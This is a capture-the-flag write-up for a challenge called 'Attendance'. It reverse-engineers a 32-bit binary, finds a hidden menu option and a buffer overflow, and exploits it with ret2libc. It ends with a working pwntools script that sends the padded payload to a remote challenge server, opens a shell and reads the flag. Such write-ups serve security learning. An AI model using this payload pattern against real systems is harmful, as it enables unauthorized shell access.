# Attendance

![](./img/1.png#center)

I will first look the file with binaryninja.

The main function :

![](./img/2.png#center)

You can see that the binary ask us an action. If I go down a little in the main function, I can see that the input I will give to the binary will be compared. For example if my entry is 2, then we’ll call student 2. If I enter 3, we’ll call student 3,…

![](./img/3.png#center)

So let’s try if it works :

![](./img/4.png#center)

We can see that it is working and that we are leaving the program directly. Let’s go back to examine the binary, a comparison draws my attention below the students in the main function :

![](./img/5.png#center)

If my entry is equal to 0x7a69(31337 in decimal) we jump to the function called « principal ». Let’s take a look at this function :

![](./img/6.png#center)

As you can see, we can leave a message with the principal, so we’re gonna try this :

![](./img/7.png#center)

The vulnerability will therefore be at the moment when we leave the message to the principal. I will now use the ret2libc vulnerability. To use this vulnerability we need:

->Padding + p system + p exit + p ‘/bin/sh’<-

after a while, I arrived at 41 in padding, to find the system and exit address I have to run the binary with gdb, put a breakpoint on the main. Then using these commands I get the addresses:
->p system<-
->p exit<-

![](./img/8.png#center)

Now I just need to find the address of the string « /bin/sh » in the binary. For that I go back to look around BinaryNinja and I look at the function bring_students_to_school, and I see my « /bin/sh », it only remains for me to find its address. With objdump I find the address of the function :

![](./img/9.png#center)

Now that we have everything we juste need a script to automate the pwn :

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

from pwn import *
import struct

p = remote("89.38.210.128", 31337)
Call = p.recvuntil("Call>")
print(Call)
payload ="31337"
p.send(payload)
p.recv(1024)
p.send("A"*41+p32(0xf7df67d0)+p32(0xf7de9b10)+p32(0x08048660))
p.interactive()
#cat /home/attendance/flag
#timctf{l1ttl3_th1ngs_m4k3_b1g_th1ngs_h4pp3n}
```

![](./img/10.png#center)